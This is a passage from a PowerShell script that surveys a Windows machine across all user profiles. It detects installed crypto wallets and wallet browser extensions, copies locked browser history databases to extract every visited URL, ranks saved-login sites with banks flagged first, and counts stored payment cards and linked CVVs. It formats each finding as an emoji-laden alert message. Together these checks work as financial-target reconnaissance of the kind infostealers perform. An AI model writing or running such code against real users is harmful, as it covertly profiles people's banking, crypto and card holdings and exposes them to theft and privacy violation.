        $payload = Read-PayloadLocal $info.Bytes ([int]$r.Off) $r.Len $info.PageSize $info.Usable $info.TotalPages
        $n = 0
        $hdrSize = Read-Varint $payload 0 ([ref]$n)
        $body = [int]$hdrSize
        $pos = $n
        $k = 0
        $found = $null
        while ($pos -lt $hdrSize) {
            $m = 0
            $tp = Read-Varint $payload $pos ([ref]$m)
            $sz = 0
            if ($tp -ge 12) {
                if (($tp % 2) -eq 0) { $sz = [int](($tp - 12) / 2) } else { $sz = [int](($tp - 13) / 2) }
            }
            elseif ($tp -eq 1) { $sz = 1 }
            elseif ($tp -eq 2) { $sz = 2 }
            elseif ($tp -eq 3) { $sz = 3 }
            elseif ($tp -eq 4) { $sz = 4 }
            elseif ($tp -eq 5) { $sz = 6 }
            elseif ($tp -eq 6 -or $tp -eq 7) { $sz = 8 }
            if ($k -eq $idx) {
                # We extract only the requested (text) column and touch no other column.
                if ($tp -ge 13 -and ($tp % 2) -eq 1 -and $sz -gt 0) { $found = $info.Enc.GetString($payload, $body, $sz) }
                break
            }
            $body += $sz
            $pos += $m
            $k++
        }
        if ($null -ne $found -and -not [string]::IsNullOrWhiteSpace($found)) { [void]$out.Add($found) }
    }
    return $out
}

function Copy-LockedFile {
    <# Copies a file in use (open browser) via read sharing - without modifying the source. #>
    param([string]$Source, [string]$Dest)
    $fs = [System.IO.File]::Open($Source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    try {
        $out = [System.IO.File]::Create($Dest)
        try { $fs.CopyTo($out) } finally { $out.Dispose() }
    } finally { $fs.Dispose() }
}

function ConvertFrom-WebkitTime {
    <# Microseconds since 1601-01-01 (Chrome / Edge / Brave / Vivaldi / Opera / Chromium). #>
    param([long]$Micros)
    if ($Micros -le 0) { return $null }
    try {
        if ($Micros -gt 265046774399999999) { return $null }
        return ([datetime]::FromFileTimeUtc([long]($Micros * 10))).ToLocalTime()
    } catch { return $null }
}

function ConvertFrom-UnixMicros {
    <# Microseconds since 1970-01-01 (Firefox moz_places.last_visit_date). #>
    param([long]$Micros)
    if ($Micros -le 0) { return $null }
    try {
        $base = [datetime]::new(1970, 1, 1, 0, 0, 0, ([System.DateTimeKind]::Utc))
        return $base.AddSeconds([double]($Micros / 1000000.0)).ToLocalTime()
    } catch { return $null }
}


# =====================================================================
#  9)  Check 1: installed programs (registry) -> desktop wallets
# =====================================================================

function Invoke-InstalledProgramScan {
    Write-Log 'Scanning installed programs (registry)...'

    $keywords = @(Get-Prop $Script:Wallets 'desktop_wallets' @())
    if ($keywords.Count -eq 0) { Write-Log 'desktop_wallets list is empty.' 'WARN'; return }

    # Machine-wide entries plus per-user entries from every loaded hive. The previous
    # HKCU path failed in SYSTEM context (HKCU has no Uninstall key there); HKEY_USERS
    # is enumerated per SID so hives that cannot be read are skipped instead of alerting.
    $paths = @(
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    try {
        $hkuSids = @(Get-ChildItem -Path 'Registry::HKEY_USERS' -ErrorAction SilentlyContinue |
            Where-Object { $_.PSChildName -like 'S-1-5-21-*' })
        foreach ($sid in $hkuSids) {
            $paths += ('Registry::HKEY_USERS\' + $sid.PSChildName + '\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
        }
    } catch { }

    $scanned = 0
    foreach ($p in $paths) {
        try { $items = @(Get-ItemProperty -Path $p -ErrorAction Stop) }
        catch {
            if ($p -like 'Registry::HKEY_USERS*') {
                # Another user's hive is not readable from this context - skip silently.
                Write-Log "Skipped registry path '$p' (not readable from this context)." 'DEBUG'
            } else {
                Add-Error "Could not read registry path '$p': $($_.Exception.Message)"
            }
            continue
        }

        foreach ($it in $items) {
            $scanned++
            $dn = [string](Get-Prop $it 'DisplayName' '')
            if ([string]::IsNullOrWhiteSpace($dn)) { continue }

            $kw = Get-MatchedKeyword -Text $dn -Keywords $keywords
            if (-not $kw) { continue }

            $ver  = [string](Get-Prop $it 'DisplayVersion' '')
            $date = [string](Get-Prop $it 'InstallDate' '')
            $loc  = [string](Get-Prop $it 'InstallLocation' '')
            $pub  = [string](Get-Prop $it 'Publisher' '')

            if ($date -match '^(\d{4})(\d{2})(\d{2})$') { $date = "$($Matches[1])-$($Matches[2])-$($Matches[3])" }

            $msg = @()
            $msg += '🔴 <b>New detection: desktop wallet</b>'
            $msg += '━━━━━━━━━━━━━━━━'
            $msg += "📛 Name: <code>$(ConvertTo-HtmlSafe (Limit-Text $dn 90))</code>"
            $msg += "📦 Version: $(ConvertTo-HtmlSafe (Limit-Text $ver 40))"
            $msg += "📅 Install date: $(ConvertTo-HtmlSafe (Limit-Text $date 30))"
            if ($loc) { $msg += "📁 Path: <code>$(ConvertTo-HtmlSafe (Limit-Text $loc 160))</code>" }
            if ($pub) { $msg += "🏢 Publisher: $(ConvertTo-HtmlSafe (Limit-Text $pub 80))" }
            $msg += "🔎 Keyword: <code>$(ConvertTo-HtmlSafe $kw)</code>"
            $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
            $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"

            $key = "registry|$dn|$ver|$loc"
            $isNew = Register-Finding -Type 'desktop' -Key $key -Label $dn -Message ($msg -join "`n")
            if ($isNew) { Add-DailyCounter -Type 'desktop' }
            Write-Log "Desktop wallet: $dn $ver" 'INFO'
        }
    }
    Write-Log "Scanned $scanned installed-program registry entries."
}

# =====================================================================
#  10)  Check 2: browser extensions
# =====================================================================

function Resolve-ExtensionMessage {
    param([string]$Message, [string]$ExtVersionDir, [string]$DefaultLocale)
    if ([string]::IsNullOrWhiteSpace($Message)) { return '' }
    if ($Message -notmatch '^__MSG_(.+)__$') { return $Message }

    $key = $Matches[1]
    $localesRoot = Join-Path $ExtVersionDir '_locales'
    if (-not (Test-Path -LiteralPath $localesRoot)) { return $Message }

    $candidates = New-Object System.Collections.ArrayList
    if ($DefaultLocale) { [void]$candidates.Add($DefaultLocale) }
    foreach ($d in @(Get-ChildItem -LiteralPath $localesRoot -Directory -Force -ErrorAction SilentlyContinue)) {
        if (-not $candidates.Contains($d.Name)) { [void]$candidates.Add($d.Name) }
    }

    foreach ($loc in $candidates) {
        $f = Join-Path (Join-Path $localesRoot $loc) 'messages.json'
        if (-not (Test-Path -LiteralPath $f)) { continue }
        try {
            $j = Read-JsonFile $f
            $entry = $j.PSObject.Properties[$key]
            if ($entry -and $entry.Value -and $entry.Value.message) { return [string]$entry.Value.message }
        } catch { }
    }
    return $Message
}

function Get-ChromiumPreferencesExtensions {
    param([string]$ProfileDir)
    $result = @{}
    foreach ($fileName in @('Secure Preferences', 'Preferences')) {
        $p = Join-Path $ProfileDir $fileName
        if (-not (Test-Path -LiteralPath $p)) { continue }
        try {
            $fi = Get-Item -LiteralPath $p -ErrorAction Stop
            if ($fi.Length -gt 40MB) { Write-Log "Skipping $fileName (file too large: $([int]($fi.Length/1MB))MB)" 'DEBUG'; continue }
            $j = Read-JsonFile $p
        } catch {
            Add-Error "Could not read $fileName in $ProfileDir : $($_.Exception.Message)"
            continue
        }

        $ext = Get-Prop $j 'extensions' $null
        $settings = Get-Prop $ext 'settings' $null
        if (-not $settings) { continue }

        foreach ($prop in $settings.PSObject.Properties) {
            $id = $prop.Name
            if ($id -eq 'nmmhkkegccagdldgiimedpiccmgmieda' -or $id.Length -ne 32) { continue }
            $val = $prop.Value
            $mf = Get-Prop $val 'manifest' $null
            $name = ''
            if ($mf) { $name = Resolve-ExtensionMessage -Message ([string](Get-Prop $mf 'name' '')) -ExtVersionDir $ProfileDir -DefaultLocale ([string](Get-Prop $mf 'default_locale' 'en')) }
            $ver = [string](Get-Prop $mf 'version' (Get-Prop $val 'manifest.version' ''))
            $state = [int](Get-Prop $val 'state' 0)

            $result[$id] = @{ name = $name; version = $ver; state = $state; from = $fileName }
        }
    }
    return $result
}

function Get-ChromiumDiskExtensions {
    param([string]$ProfileDir, [string]$ProfileName, [string]$BrowserName)

    $out = New-Object System.Collections.ArrayList
    $extRoot = Join-Path $ProfileDir 'Extensions'
    if (-not (Test-Path -LiteralPath $extRoot)) { return @() }

    foreach ($idDir in @(Get-ChildItem -LiteralPath $extRoot -Directory -Force -ErrorAction SilentlyContinue)) {
        $versionDirs = @(Get-ChildItem -LiteralPath $idDir.FullName -Directory -Force -ErrorAction SilentlyContinue |
                         Where-Object { $_.Name -notlike '_*' } |
                         Sort-Object { [string]$_.Name } -Descending)

        $manifestPath = $null; $verDirFull = $null
        foreach ($vd in $versionDirs) {
            $mp = Join-Path $vd.FullName 'manifest.json'
            if (Test-Path -LiteralPath $mp) { $manifestPath = $mp; $verDirFull = $vd.FullName; break }
        }
        if (-not $manifestPath) { continue }

        try { $mf = Read-JsonFile $manifestPath } catch { continue }

        $rawName = [string](Get-Prop $mf 'name' '')
        $name = Resolve-ExtensionMessage -Message $rawName -ExtVersionDir $verDirFull -DefaultLocale ([string](Get-Prop $mf 'default_locale' 'en'))
        $desc = Resolve-ExtensionMessage -Message ([string](Get-Prop $mf 'description' '')) -ExtVersionDir $verDirFull -DefaultLocale ([string](Get-Prop $mf 'default_locale' 'en'))
        $ver  = [string](Get-Prop $mf 'version' '')

        $perms = @()
        $perms += @(Get-Prop $mf 'permissions' @())
        $perms += @(Get-Prop $mf 'host_permissions' @())
        $perms = @($perms | Where-Object { $_ } | Select-Object -Unique)

        [void]$out.Add([PSCustomObject]@{
            Id          = $idDir.Name
            Name        = $name
            RawName     = $rawName
            Version     = $ver
            Description = $desc
            Permissions = $perms
            Profile     = $ProfileName
            Browser     = $BrowserName
            Path        = $verDirFull
        })
    }
    return $out
}

function Get-ChromiumProfiles {
    param([string]$UserDataDir)
    $profiles = New-Object System.Collections.ArrayList
    $skip = @('System Profile', 'Guest Profile', 'Snapshots', 'ShaderCache', 'GrShaderCache',
              'GraphiteDawnCache', 'BrowserMetrics', 'Crashpad', 'SwReporter', 'WidevineCdm',
              'component_crx_cache', 'extensions_crx_cache', 'optimization_guide_model_store')
    foreach ($d in @(Get-ChildItem -LiteralPath $UserDataDir -Directory -Force -ErrorAction SilentlyContinue)) {
        if ($skip -contains $d.Name) { continue }
        $hasHistory = Test-Path -LiteralPath (Join-Path $d.FullName 'History')
        $hasExt     = Test-Path -LiteralPath (Join-Path $d.FullName 'Extensions')
        $hasPrefs   = (Test-Path -LiteralPath (Join-Path $d.FullName 'Preferences')) -or (Test-Path -LiteralPath (Join-Path $d.FullName 'Secure Preferences'))
        if ($hasHistory -or $hasExt -or $hasPrefs) { [void]$profiles.Add($d) }
    }
    return $profiles
}

function New-ExtensionMessage {
    param(
        [string]$Name, [string]$Version, [string]$Browser, [string]$Profile,
        [string]$ExtId, [string]$State, [string]$Permissions, [string]$Description, [string]$Source
    )
    $msg = @()
    $msg += '🟠 <b>New detection: browser wallet extension</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🧩 Extension: <b>$(ConvertTo-HtmlSafe (Limit-Text $Name 90))</b>"
    $msg += "📦 Version: $(ConvertTo-HtmlSafe (Limit-Text $Version 30))"
    $msg += "🌐 Browser: $(ConvertTo-HtmlSafe $Browser)"
    $msg += "👤 Profile: <code>$(ConvertTo-HtmlSafe $Profile)</code>"
    if ($ExtId) { $msg += "🆔 ID: <code>$(ConvertTo-HtmlSafe (Limit-Text $ExtId 120))</code>" }
    $msg += "📌 Status: $(ConvertTo-HtmlSafe $State)"
    if ($Source) { $msg += "📎 Source: $(ConvertTo-HtmlSafe $Source)" }
    if ($Permissions) { $msg += "🔑 Permissions: <code>$(ConvertTo-HtmlSafe (Limit-Text $Permissions 350))</code>" }
    if ($Description) { $msg += "📝 Description: $(ConvertTo-HtmlSafe (Limit-Text $Description 150))" }
    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
    return ($msg -join "`n")
}

function Invoke-BrowserExtensionScan {
    Write-Log 'Scanning browser extensions...'

    $extKeywords = @(Get-Prop $Script:Wallets 'browser_extensions' @())
    $totalExt = 0

    foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
        if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
        $browserName = [string](Get-Prop $br 'name' 'Chromium')
        $userData = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
        if (-not $userData -or -not (Test-Path -LiteralPath $userData)) { continue }

        foreach ($prof in (Get-ChromiumProfiles -UserDataDir $userData)) {
            $diskExts = @()
            try { $diskExts = @(Get-ChromiumDiskExtensions -ProfileDir $prof.FullName -ProfileName $prof.Name -BrowserName $browserName) }
            catch { Add-Error "Failed to scan extensions for $browserName/$($prof.Name): $($_.Exception.Message)" }

            $prefExts = @{}
            try { $prefExts = Get-ChromiumPreferencesExtensions -ProfileDir $prof.FullName }
            catch { Add-Error "Failed to read Preferences for $browserName/$($prof.Name): $($_.Exception.Message)" }

            $seenIds = New-Object 'System.Collections.Generic.HashSet[string]'

            foreach ($e in $diskExts) {
                $totalExt++
                [void]$seenIds.Add($e.Id)

                $name = $e.Name
                $ver  = $e.Version
                $stateTxt = 'Enabled (on disk)'
                if ($prefExts.ContainsKey($e.Id)) {
                    $pe = $prefExts[$e.Id]
                    if ($name -like '__MSG_*' -or [string]::IsNullOrWhiteSpace($name)) { if ($pe.name) { $name = $pe.name } }
                    if (-not $ver -and $pe.version) { $ver = $pe.version }
                    $stateTxt = switch ($pe.state) {
                        '0' { 'Enabled' }
                        '1' { 'Disabled' }
                        '2' { 'Disabled by user' }
                        default { "state=$($pe.state)" }
                    }
                }

                $kw = Get-MatchedKeyword -Text "$name $($e.RawName) $($e.Description)" -Keywords $extKeywords
                if (-not $kw) { $kw = Get-MatchedKeyword -Text "$name" -Keywords $extKeywords }
                if (-not $kw) { continue }

                $permTxt = if ($e.Permissions.Count -gt 0) { ($e.Permissions -join ', ') } else { '' }
                $msg = New-ExtensionMessage -Name $name -Version $ver -Browser $browserName -Profile $e.Profile `
                    -ExtId $e.Id -State $stateTxt -Permissions $permTxt -Description $e.Description -Source ''

                $key = "chromium-ext|$browserName|$($e.Profile)|$($e.Id)"
                $isNew = Register-Finding -Type 'extension' -Key $key -Label "$name ($browserName/$($e.Profile))" -Message $msg
                if ($isNew) { Add-DailyCounter -Type 'extension' }
                Write-Log "Wallet extension: $name [$browserName/$($e.Profile)] $ver" 'INFO'
            }

            foreach ($id in $prefExts.Keys) {
                if ($seenIds.Contains($id)) { continue }
                $pe = $prefExts[$id]
                $kw = Get-MatchedKeyword -Text "$($pe.name)" -Keywords $extKeywords
                if (-not $kw) { continue }

                $msg = New-ExtensionMessage -Name $pe.name -Version $pe.version -Browser $browserName -Profile $prof.Name `
                    -ExtId $id -State 'Not present on disk' -Permissions '' -Description '' -Source "$($pe.from)"
                $key = "chromium-ext|$browserName|$($prof.Name)|$id"
                $isNew = Register-Finding -Type 'extension' -Key $key -Label "$($pe.name) ($browserName/$($prof.Name))" -Message $msg
                if ($isNew) { Add-DailyCounter -Type 'extension' }
            }
        }
    }

    # ---------- Firefox ----------
    $ff = Get-Prop $Script:Cfg 'firefox' $null
    if ($ff -and [bool](Get-Prop $ff 'enabled' $true)) {
        $ffRoot = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
        if ($ffRoot -and (Test-Path -LiteralPath $ffRoot)) {
            foreach ($prof in @(Get-ChildItem -LiteralPath $ffRoot -Directory -Force -ErrorAction SilentlyContinue)) {
                $extJson = Join-Path $prof.FullName 'extensions.json'
                if (-not (Test-Path -LiteralPath $extJson)) { continue }

                try { $j = Read-JsonFile $extJson }
                catch { Add-Error "Could not read extensions.json for Firefox profile $($prof.Name): $($_.Exception.Message)"; continue }

                foreach ($a in @(Get-Prop $j 'addons' @())) {
                    if ([string](Get-Prop $a 'type' '') -ne 'extension') { continue }
                    $location = [string](Get-Prop $a 'location' '')
                    if ($location -in @('app-builtin', 'app-system-defaults', 'app-global')) { continue }

                    $totalExt++
                    $dl = Get-Prop $a 'defaultLocale' $null
                    $name = [string](Get-Prop $dl 'name' (Get-Prop $a 'id' ''))
                    $ver  = [string](Get-Prop $a 'version' '')
                    $active = Get-Prop $a 'active' $null

                    $kw = Get-MatchedKeyword -Text $name -Keywords $extKeywords
                    if (-not $kw) { continue }

                    $stateTxt = if ($active -eq $false) { 'Disabled' } else { 'Enabled' }
                    $msg = New-ExtensionMessage -Name $name -Version $ver -Browser 'Firefox' -Profile $prof.Name `
                        -ExtId ([string](Get-Prop $a 'id' '')) -State $stateTxt -Permissions '' -Description '' -Source ([string](Get-Prop $a 'path' ''))

                    $key = "firefox-ext|$($prof.Name)|$([string](Get-Prop $a 'id' ''))"
                    $isNew = Register-Finding -Type 'extension' -Key $key -Label "$name (Firefox/$($prof.Name))" -Message $msg
                    if ($isNew) { Add-DailyCounter -Type 'extension' }
                    Write-Log "Wallet extension: $name [Firefox/$($prof.Name)] $ver" 'INFO'
                }
            }
        }
    }

    Write-Log "Scanned $totalExt extensions (before filtering)."
}

# =====================================================================
#  11)  URL classification
# =====================================================================

function Normalize-HistoryUrl {
    <# Normalization key for a URL: no fragment, no trailing slash, lowercase. #>
    param([string]$Url)
    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }
    $u = $Url.Trim()
    $i = $u.IndexOf('#')
    if ($i -ge 0) { $u = $u.Substring(0, $i) }
    $u = $u.TrimEnd('/')
    return $u.ToLowerInvariant()
}

function Get-UrlHost {
    param([string]$Url)
    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }
    $h = ''
    $m = [regex]::Match($Url, '^[a-zA-Z][a-zA-Z0-9+.\-]*://([^/:?#]+)')
    if ($m.Success) { $h = $m.Groups[1].Value }
    else {
        $m2 = [regex]::Match($Url, '^([^/:?#]+)')
        if ($m2.Success) { $h = $m2.Groups[1].Value }
    }
    return $h.ToLower().Trim()
}

function Test-DomainMatch {
    # Note: a parameter cannot be named $Host because it is a read-only automatic variable in PowerShell
    param([string]$HostName, [string[]]$Domains)
    if (-not $HostName) { return $false }
    foreach ($d in $Domains) {
        if ([string]::IsNullOrWhiteSpace($d)) { continue }
        $dd = $d.ToLower().Trim()
        if ($HostName -eq $dd) { return $true }
        if ($HostName.EndsWith('.' + $dd, [System.StringComparison]::Ordinal)) { return $true }
        # Fallback: substring match for long domains
        if ($dd.Length -ge 6 -and $HostName.Contains($dd)) { return $true }
    }
    return $false
}

function Test-CryptoKeyword {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $false }
    $low = $Text.ToLower()
    $kws = @(Get-Prop $Script:Wallets 'crypto_keywords' @())
    foreach ($kw in $kws) {
        if ([string]::IsNullOrWhiteSpace($kw)) { continue }
        $k = $kw.ToLower()
        if ($k.Length -ge 5) {
            if ($low.Contains($k)) { return $true }
        } else {
            # Short words (eth/sol/btc/nft/dex/cex/bnb) with clear boundaries to prevent false matches
            $pattern = '(^|[^a-z0-9])' + [regex]::Escape($k) + '([^a-z0-9]|$)'
            if ([regex]::IsMatch($low, $pattern)) { return $true }
        }
    }
    return $false
}

function Get-UrlCategory {
    param([string]$Url, [string]$Title = '')
    $host_ = Get-UrlHost $Url

    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'wallet_domains' @())) { return 'wallet' }
    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'exchanges_domains' @())) { return 'exchange' }
    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'dapp_domains' @())) { return 'dapp' }

    $text = "$host_ $Url $Title"
    if (Test-CryptoKeyword -Text $text) { return 'crypto' }
    return 'other'
}

function Get-CategoryMeta {
    param([string]$Category)
    switch ($Category) {
        'wallet'   { return @{ Order = 1; Icon = '🟣'; Title = 'Wallets' } }
        'exchange' { return @{ Order = 2; Icon = '🟠'; Title = 'Exchanges' } }
        'dapp'     { return @{ Order = 3; Icon = '🔵'; Title = 'DApps' } }
        'crypto'   { return @{ Order = 4; Icon = '🟡'; Title = 'Crypto sites' } }
        default    { return @{ Order = 5; Icon = '⚪'; Title = 'Other' } }
    }
}

function Get-LoginCategory {
    <# Classifies a saved-login site: banks/payments first (config list, then the
       verified online-bank domain list, then distinctive FDIC institution name
       tokens), then dApps, then crypto exchanges and wallets (config lists + the
       verified crypto-platform lists; exchanges are checked before wallets so
       multi-product platforms such as coinbase.com classify as exchanges), then
       other crypto platforms, shopping/retail, and crypto keywords; host-name
       banking keywords are a last-resort heuristic before 'other'. #>
    param([string]$Url)
    $host_ = Get-UrlHost $Url
    if ([string]::IsNullOrWhiteSpace($host_)) { return 'other' }

    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'bank_domains' @())) { return 'bank' }
    $vl = Get-VerifiedLists
    if (Test-DomainMatch -HostName $host_ -Domains $vl.BankDomains) { return 'bank' }
    if (Test-HostTokenMatch -HostName $host_ -Tokens $vl.FdicTokens) { return 'bank' }

    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'dapp_domains' @())) { return 'dapp' }
    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'exchanges_domains' @())) { return 'exchange' }
    if (Test-DomainMatch -HostName $host_ -Domains $vl.CryptoExchanges) { return 'exchange' }
    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'wallet_domains' @())) { return 'wallet' }
    if (Test-DomainMatch -HostName $host_ -Domains $vl.CryptoWallets) { return 'wallet' }
    if (Test-DomainMatch -HostName $host_ -Domains $vl.CryptoOther) { return 'crypto' }
    if (Test-DomainMatch -HostName $host_ -Domains $vl.ShoppingDomains) { return 'shopping' }
    if (Test-CryptoKeyword -Text $host_) { return 'crypto' }

    $low = $host_.ToLowerInvariant()
    foreach ($bk in @('bank', 'banca', 'banque', 'banc', 'credit', 'crédit',
                      'insure', 'insurance', 'financial', 'finance', 'virement',
                      'netbanking', 'ebanking', 'ebank', 'payment')) {
        if ($low -like ('*' + $bk + '*')) { return 'bank' }
    }
    return 'other'
}

function Get-LoginCategoryMeta {
    <# Display metadata (icon + title) for the saved-login categories - banks first
       (they are flagged IMPORTANT in the report), then wallets, exchanges,
       shopping, dApps, crypto and other. #>
    param([string]$Category)
    switch ($Category) {
        'bank'     { return @{ Order = 1; Icon = '🏨'; Title = 'Banks & payments' } }
        'wallet'   { return @{ Order = 2; Icon = '🟣'; Title = 'Crypto wallets' } }
        'exchange' { return @{ Order = 3; Icon = '🟠'; Title = 'Exchanges' } }
        'shopping' { return @{ Order = 4; Icon = '🛍️'; Title = 'Shopping & retail' } }
        'dapp'     { return @{ Order = 5; Icon = '🔵'; Title = 'DApps' } }
        'crypto'   { return @{ Order = 6; Icon = '🟡'; Title = 'Crypto sites' } }
        default    { return @{ Order = 7; Icon = '⚪'; Title = 'Other' } }
    }
}

# =====================================================================
#  12)  Check 3: browser history (direct PowerShell reader -> all URLs)
# =====================================================================

function New-TempDir {
    $base = [string]$env:TEMP
    if ([string]::IsNullOrWhiteSpace($base)) { $base = [System.IO.Path]::GetTempPath() }
    if ([string]::IsNullOrWhiteSpace($base)) { $base = $Script:ScriptDir }
    $dir = Join-Path $base ("wm_{0}" -f ([guid]::NewGuid().ToString('N').Substring(0, 8)))
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    return $dir
}

function Get-HistoryHits {
    <# Pulls all history URLs from all browsers (Chromium family + Firefox). #>
    $hc       = Get-Prop $Script:Cfg 'browser_history' $null
    $lookback = [int](Get-Prop $hc 'lookback_days' 0)
    $maxRows  = [int](Get-Prop $hc 'max_results_per_browser' 2000)
    if ($maxRows -le 0) { $maxRows = 300 }
    $cutoff = $null
    if ($lookback -gt 0) { $cutoff = (Get-Date).AddDays(-$lookback) }

    $hits   = New-Object System.Collections.ArrayList
    $errors = New-Object System.Collections.ArrayList
    $stats  = New-Object System.Collections.ArrayList
    $tmpDir = New-TempDir

    try {
        # ---------- Chromium family ----------
        foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
            if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
            $name = [string](Get-Prop $br 'name' 'Chromium')
            $ud = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
            if (-not $ud -or -not (Test-Path -LiteralPath $ud)) { continue }

            foreach ($prof in @(Get-ChromiumProfiles $ud)) {
                $hist = Join-Path $prof.FullName 'History'
                if (-not (Test-Path -LiteralPath $hist)) { continue }
                $tmp = Join-Path $tmpDir ("chromium_" + [guid]::NewGuid().ToString('N') + ".db")
                try {
                    Copy-LockedFile -Source $hist -Dest $tmp
                    $res  = Get-SqliteTableData -Path $tmp -Table 'urls'
                    $cols = @($res.Columns)
                    $iu = [array]::IndexOf($cols, 'url')
                    $it = [array]::IndexOf($cols, 'title')
                    $iv = [array]::IndexOf($cols, 'visit_count')
                    $il = [array]::IndexOf($cols, 'last_visit_time')
                    if ($iu -lt 0 -or $il -lt 0) { continue }
                    $n = 0
                    foreach ($row in @($res.Rows)) {
                        $u = [string]$row[$iu]
                        if ([string]::IsNullOrWhiteSpace($u)) { continue }
                        $dt = ConvertFrom-WebkitTime ([long]$row[$il])
                        if ($cutoff -and ($null -eq $dt -or $dt -lt $cutoff)) { continue }
                        $title = ''; if ($it -ge 0 -and $null -ne $row[$it]) { $title = [string]$row[$it] }
                        $vis = 0;    if ($iv -ge 0 -and $null -ne $row[$iv]) { $vis = [int]$row[$iv] }
                        [void]$hits.Add([PSCustomObject]@{ Browser = $name; Profile = $prof.Name; Url = $u; Title = $title; Visits = $vis; LastTs = $dt })
                        $n++
                        if ($n -ge $maxRows) { break }
                    }
                    [void]$stats.Add([PSCustomObject]@{ Browser = $name; Profile = $prof.Name; Count = $n })
                } catch {
                    [void]$errors.Add("$name/$($prof.Name): $($_.Exception.Message)")
                } finally {
                    if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
                }
            }
        }

        # ---------- Firefox ----------
        $ff = Get-Prop $Script:Cfg 'firefox' $null
        if ([bool](Get-Prop $ff 'enabled' $true)) {
            $root = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
            if ($root -and (Test-Path -LiteralPath $root)) {
                foreach ($prof in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
                    $places = Join-Path $prof.FullName 'places.sqlite'
                    if (-not (Test-Path -LiteralPath $places)) { continue }
                    $tmp = Join-Path $tmpDir ("firefox_" + [guid]::NewGuid().ToString('N') + ".db")
                    try {
                        Copy-LockedFile -Source $places -Dest $tmp
                        $res  = Get-SqliteTableData -Path $tmp -Table 'moz_places'
                        $cols = @($res.Columns)
                        $iu = [array]::IndexOf($cols, 'url')
                        $it = [array]::IndexOf($cols, 'title')
                        $iv = [array]::IndexOf($cols, 'visit_count')
                        $il = [array]::IndexOf($cols, 'last_visit_date')
                        if ($iu -lt 0 -or $il -lt 0) { continue }
                        $n = 0
                        foreach ($row in @($res.Rows)) {
                            $u = [string]$row[$iu]
                            if ([string]::IsNullOrWhiteSpace($u)) { continue }
                            $dt = $null
                            if ($null -ne $row[$il]) { $dt = ConvertFrom-UnixMicros ([long]$row[$il]) }
                            if ($cutoff -and ($null -eq $dt -or $dt -lt $cutoff)) { continue }
                            $title = ''; if ($it -ge 0 -and $null -ne $row[$it]) { $title = [string]$row[$it] }
                            $vis = 0;    if ($iv -ge 0 -and $null -ne $row[$iv]) { $vis = [int]$row[$iv] }
                            [void]$hits.Add([PSCustomObject]@{ Browser = 'Firefox'; Profile = $prof.Name; Url = $u; Title = $title; Visits = $vis; LastTs = $dt })
                            $n++
                            if ($n -ge $maxRows) { break }
                        }
                        [void]$stats.Add([PSCustomObject]@{ Browser = 'Firefox'; Profile = $prof.Name; Count = $n })
                    } catch {
                        [void]$errors.Add("Firefox/$($prof.Name): $($_.Exception.Message)")
                    } finally {
                        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
                    }
                }
            }
        }
    } finally {
        Remove-Item -LiteralPath $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    return @{ Hits = @($hits); Errors = @($errors); Stats = @($stats) }
}

# =====================================================================
#  12.5)  Check 4-b: saved payment cards (count-only — no extraction)
#        - Chromium/Edge/Brave/Vivaldi/Chromium: credit_cards table in "Web Data"
#        - CVV linkage via the local_stored_cvc table (guid match) — count-only
#        - Firefox: autofill-profiles.json file (never stores CVV)
# =====================================================================

function New-CardStat {
    param([string]$Browser, [string]$Profile, [int]$Cards, [int]$CvvLinked, [bool]$CvvKnown, [string]$Source)
    return [PSCustomObject]@{
        Browser   = $Browser
        Profile   = $Profile
        Cards     = $Cards
        CvvLinked = $CvvLinked
        CvvKnown  = $CvvKnown
        Source    = $Source
    }
}

function Get-CardCountsFromSqlite {
    <# Counts cards from "Web Data" + checks CVC linkage. Read-only and count-only:
       Counts credit_cards rows cell-by-cell, and reads only the guid column for matching against local_stored_cvc.
       The name/encrypted-number columns are neither decrypted, copied, nor sent. #>
    param([string]$DbPath, [string]$TmpDir, [string]$CardsTable = 'credit_cards', [string]$CvvTable = 'local_stored_cvc')
    $result = @{ Cards = 0; CvvLinked = 0; CvvKnown = $false; HasCvvTable = $false }
    if (-not (Test-Path -LiteralPath $DbPath)) { return $result }
    if ([string]::IsNullOrWhiteSpace($TmpDir)) { $TmpDir = New-TempDir }
    $tmp = Join-Path $TmpDir ("cards_" + [guid]::NewGuid().ToString('N') + ".db")
    try {
